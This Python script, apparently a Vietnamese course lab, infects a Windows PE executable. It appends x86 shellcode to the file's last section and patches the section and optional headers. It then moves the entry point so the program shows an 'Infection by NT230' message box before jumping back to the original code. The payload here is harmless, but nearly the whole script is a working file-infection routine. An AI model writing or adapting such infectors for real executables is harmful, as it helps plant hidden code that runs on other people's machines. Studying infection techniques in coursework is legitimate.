import pefile
import os

#Doc file thuc thi se tan cong
pe_file = "calcR01.exe"

pe = pefile.PE(pe_file)
sizeOfFile = os.path.getsize(pe_file)
#Tim cac thong tin: AddressOfEntryPoint, ImageBase, VA, RA, Virtual Size, Raw Size
addressOfEntryPoint = pe.OPTIONAL_HEADER.AddressOfEntryPoint
imageBase = pe.OPTIONAL_HEADER.ImageBase

print(addressOfEntryPoint)
print(imageBase)

if (pe.FILE_HEADER.NumberOfSections > 0):
    lastSection = pe.sections[-1]
    virtualSize = lastSection.Misc_VirtualSize
    virtualAddress = lastSection.VirtualAddress
    sizeOfRawData = lastSection.SizeOfRawData
    pointerToRawData = lastSection.PointerToRawData


#Tim MessageBoxW trong USER32.dll
MessageBoxW = ''
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    if entry.dll.lower() == b'user32.dll':
        for imp in entry.imports:
                if imp.name == b'MessageBoxW':
                    MessageBoxW = imp.address
                    print(imp.name, hex(imp.address))
                
#Them 500 bytes vao cuoi file
numByteToAdd = 500
with open(pe_file, 'ab') as file:
    file.seek(0, os.SEEK_END)
    file.write(b'\x00' * numByteToAdd)
    
#Tinh caption, text, new entry point, relativeRA
caption = sizeOfFile + 0x40 - pointerToRawData + virtualAddress + imageBase
text = sizeOfFile + 0x80 - pointerToRawData + virtualAddress + imageBase
newEntryPoint = sizeOfFile - pointerToRawData + virtualAddress + imageBase
relativeVA = (addressOfEntryPoint + imageBase) - (newEntryPoint + 0x14 + 0x5)

#push 0
shellCode = b'\x6a\x00'

#push caption
shellCode += b'\x68' + caption.to_bytes(4, byteorder='little')

#push text
shellCode += b'\x68' + text.to_bytes(4, byteorder='little')

#push 0
shellCode += b'\x6a\x00'

#call MessageBoxW
shellCode += b'\xff\x15' + MessageBoxW.to_bytes(4, byteorder='little')

#jmp to original entry point
shellCode += b'\xe9' + relativeVA.to_bytes(4, byteorder='little', signed=True)

#Chuan bi caption và text
captionText = b'\x49\x00\x6E\x00\x66\x00\x65\x00\x63\x00\x74\x00\x69\x00\x6F\x00\x6E\x00\x20\x00\x62\x00\x79\x00\x20\x00\x4E\x00\x54\x00\x32\x00\x33\x00\x30\x00' 
textText = b'\x32\x00\x31\x00\x35\x00\x32\x00\x30\x00\x31\x00\x35\x00\x35\x00\x2D\x00\x32\x00\x31\x00\x35\x00\x32\x00\x31\x00\x31\x00\x39\x00\x31\x00\x2D\x00\x32\x00\x31\x00\x35\x00\x32\x00\x31\x00\x31\x00\x39\x00\x35'


#Chen lan luot shellcode, caption va text
with open(pe_file, 'r+b') as file:
    #Di chuyen đen vi tri chen
    file.seek(sizeOfFile)
    
    #Chen chuoi shellCode
    file.write(shellCode)

    #Di chuyen den vi tri chen Caption
    file.seek(sizeOfFile+0x40)
    
    #Chen chuoi byte
    file.write(captionText)

    #Di chuyen den vi tri chen Text
    file.seek(sizeOfFile+0x80)
    
    #Chen chuoi byte
    file.write(textText)
    
    #Thay doi cac thong tin trong section header
    with open(pe_file, 'r+b') as file:
        #Thay doi .rsrc Section Header
        lastSection.Misc_VirtualSize += numByteToAdd
        lastSection.SizeOfRawData += numByteToAdd

        #Tang SizeOfImage lên 500 trong Optional Headers
        pe.OPTIONAL_HEADER.SizeOfImage += numByteToAdd
        
        #Chinh sua AddressOfEntryPoint trong Optional Headers
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = newEntryPoint - imageBase

        #Ghi cac thay doi vao file
        file.seek(0) 
        file.write(pe.write())

